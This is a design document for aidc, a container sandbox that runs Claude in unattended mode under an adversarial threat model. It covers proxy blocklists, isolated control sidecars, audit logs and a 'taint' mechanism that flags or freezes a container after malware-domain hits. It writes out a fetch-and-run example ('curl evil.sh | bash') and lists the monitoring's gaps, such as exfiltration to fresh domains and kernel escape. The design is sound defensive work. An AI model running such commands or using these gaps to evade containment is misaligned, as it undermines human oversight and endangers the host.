# Design 07 — Safety Model

**What this covers.** The end-to-end threat model: what aidc protects against, how each defense works, and the **taint mechanism** that turns "the proxy saw something bad" into "this container is dead, throw it away." This doc is the place to look when asking "is X safe?" or "what happens when Y goes wrong?"

**Requirements implemented:** SEC-01 through SEC-08. Cross-references most other design docs.

---

## Threat model

aidc assumes a fully adversarial Claude. Claude in `--yolo` mode is treated as a process that will, if given a path, exfiltrate data, push malicious commits, modify host state, or persist malware. Not because Claude *intends* to — but because designing as if it might means we don't have to rely on its judgment.

What aidc protects against, with mitigations:

| Threat | Mitigation | Doc |
|--------|------------|-----|
| Claude modifies host files outside the mounted repo | Container filesystem isolation: only the repo is bind-mounted read-write; the rest of the container has no host visibility | `design-01-architecture.md` |
| Claude pushes a malicious commit to GitHub | No SSH keys, no GitHub tokens, no `gh`; optional system pre-push hook as belt-and-suspenders | `design-02-git-isolation.md` |
| Claude runs `curl evil.sh \| bash` | Proxy stack blocks known-bad domains (URLhaus, ThreatFox, HaGeZi-TIF) + Quad9 DNS upstream + state-actor TLD policy | `design-04-proxy-stack.md` |
| Claude destroys / spies on host Docker | DinD instead of host socket mount; inner daemon is fully scoped to the outer container | `design-03-docker-isolation.md` |
| Claude persists malware in a container image | Container is ephemeral — `aidc kill` destroys everything; next `aidc create` starts clean | `design-01-architecture.md`, this doc |
| Claude exfiltrates secrets present in the working tree | Outbound HTTPS subject to proxy; high-signal known-bad domains blocked; Quad9 NXDOMAINs threat-intel hits | `design-04-proxy-stack.md` |
| Claude tampers with the API that controls it (Phase 2) | HTTP control API runs in a separate sidecar with isolated network namespace — Claude cannot reach it | `design-06-remote-control.md` |
| Claude leaves no audit trail | Audit aggregator captures Squid access log, shell history, Claude session transcript to a host-visible directory | `design-04-proxy-stack.md` |
| A successful malware-list hit goes unnoticed | Policy sidecar marks the container *tainted* in real time, with configurable response | This doc |

---

## What aidc does NOT protect against

Being honest about residual risk:

### Working-tree secrets

If a real secret (token, private key, credential) is already in the working tree when Claude is started, Claude can read it. The proxy stack prevents exfiltration to *known-bad* destinations, but a sophisticated exfiltration to a freshly-registered domain or a legitimate-looking endpoint would not be caught. **Mitigation:** don't put secrets in the working tree. Use OS keychains and reference them at runtime, outside aidc.

### Supply-chain attacks via package managers

Claude installs `npm install`-style dependencies through the proxy. The proxy permits `registry.npmjs.org` and `pypi.org` and similar — those are not blocklisted. A malicious package on the official registry would pass the proxy. **Mitigation:** beyond aidc's scope. Usual ecosystem hygiene (lockfiles, package signatures, audit tools). aidc could in principle integrate with package-audit tools as a future feature, but doesn't in v1.

### Zero-day malware not yet on any feed

The blocklist is good but not omniscient. A brand-new domain that hasn't hit threat intel yet would pass. **Mitigation:** the state-actor TLD policy catches some of this by location; Quad9's continuous threat-intel updates catch much of the rest within hours. Residual risk is real and the taint mechanism + ephemerality limits blast radius.

### Host kernel exploits

The dev container runs `--privileged`. A kernel-level escape is possible in principle. **Mitigation:** keep the host kernel patched; consider Sysbox runtime to drop the privileged flag entirely (`design-03-docker-isolation.md`). Not addressed beyond that in v1.

### Host network position attacks

If the host is on a network where attackers can reach Docker's exposed ports, aidc itself doesn't harden the host. **Mitigation:** out of scope. aidc assumes the host's perimeter is secured by other means.

---

## The taint model

Taint is the central runtime safety mechanism. The idea: when the proxy sees a request to a known-malware domain, that's not a fluke — it's evidence that *something* inside the container is doing the wrong thing. The right response is "stop trusting this container, kill it, start fresh."

### Detection (SEC-03, SEC-04)

The **policy sidecar** (`design-04-proxy-stack.md`) tails Squid's `access.log`. For every entry:

- If the line indicates a `TCP_DENIED` matching the **malware_domains** ACL → **taint trigger.**
- If the line indicates a `TCP_DENIED` matching only the **bad_tld** ACL → log only by default; taint only if `tld_taints: true` in the effective config.

This distinction matters: malware-list hits are high-confidence compromise signals. TLD hits could be benign (a typo, a stale link, an automated tool fetching from a `.cn`-hosted CDN). We don't want to nuke a session over the latter unless the user has opted in.

### State (SEC-02)

When taint triggers, the policy sidecar atomically writes:

```
/var/state/tainted
```

(A shared volume mounted into the policy container read-write and into the dev container and `aidc status` view read-only.) The file contents:

```json
{
  "tainted_at": "2026-05-21T14:53:22Z",
  "trigger": "malware_domains",
  "domain": "evil.example",
  "squid_log_line": "<full line>"
}
```

A simple presence-check tells anyone the container is tainted; the JSON gives context.

### Response (SEC-05)

The policy sidecar's `taint_response` setting (from effective config) determines what happens next:

#### `log`

Just write the flag file. No additional action. Surfaced in `aidc status` and `aidc list`. The container keeps running.

**Use case:** unattended runs where humans review afterward. Useful for batch / automated workloads.

#### `notify` (default — SEC-08)

Write the flag + push an alert:

- Default channel: write to a host-visible FIFO at `${audit_dir}/taint-events` that any subscriber can `tail -f`.
- Optional: hit a webhook URL configured in `~/.config/aidc/config.yaml` (`notify_webhook: https://...`).
- Optional: on macOS, `osascript -e 'display notification ...'`; on Linux with notify-send, use that.

The container keeps running while the alert goes out. Pace decides what to do next.

**Use case:** default interactive mode. Pace is around; he wants to know now but doesn't want his session vaporized mid-thought.

#### `freeze`

Write the flag + immediately `docker pause aidc-<session>-dev`. Claude is frozen mid-process; nothing further executes until `aidc kill` (which can't be undone to pause). Even attaching via `aidc attach` will succeed but the underlying processes are frozen, so the user sees a stopped terminal.

**Use case:** unattended runs where containment matters more than completing in-flight work. Production-grade paranoia mode.

### Configuration

`taint_response` is set in `~/.config/aidc/config.yaml` (global default) or `<repo>/.aidc/config.yaml` (per-project override). Default if unset: `notify` (SEC-08).

```yaml
taint_response: freeze
tld_taints: true
notify_webhook: https://my-monitoring.example/aidc-alert
```

### Recovery (SEC-06)

Once tainted, **there is no rehabilitation**. The only way out is `aidc kill <name>` followed by `aidc create <name>`. The design is deliberate:

- A tainted container has, by definition, attempted to talk to known-bad infrastructure. Continuing to trust it requires investigating *what* it tried to do and *whether* it succeeded with anything we don't have visibility into.
- "Cleaning" a tainted container is hard and error-prone. Killing it is fast and certain.
- The repo's committed work is intact on the host. Restarting loses only in-progress in-container state (which is the point — anything Claude did between taint and discovery is the *suspect work*).

`aidc status` on a tainted session shows a clear "kill+recreate" instruction.

---

## Forensics: what to do after a taint event

The audit aggregator (`design-04-proxy-stack.md`) preserves everything needed for post-hoc review. After a taint event:

1. Note the audit dir: `~/aidc-audit/<session>-<timestamp>/`.
2. Read `taint-events` to see what triggered.
3. Read `squid-access.log` to see the full request leading up to the taint, including any earlier requests that might indicate how Claude got there.
4. Read `dev-shell-history` to see what commands ran.
5. Read `claude-transcript/` if available — what was Claude reasoning about?
6. Read `meta.json` for context (profile, config, image digests).

Then: `aidc kill`. The audit dir is preserved (by default forever; manual cleanup or future `aidc audit-prune`).

---

## What happens on `aidc kill` of a tainted container

Same as a normal kill, with two differences:

1. The taint flag and its context are copied into the final audit `meta.json` before tear-down.
2. The session name is not immediately reusable for a new session for 60 seconds (a small cooldown that makes accidental "kill and immediately recreate" easier to think about in retrospect).

The audit directory persists. The container is gone. A new `aidc create <same-name>` succeeds after the cooldown.

---

## Cross-references

- Container architecture: `design-01-architecture.md`
- Git isolation: `design-02-git-isolation.md`
- Docker isolation (DinD): `design-03-docker-isolation.md`
- Proxy stack (filtering, sidecars, audit): `design-04-proxy-stack.md`
- CLI (where users see taint state): `design-05-cli.md`
- Remote control (Phase 2 sidecar isolation): `design-06-remote-control.md`
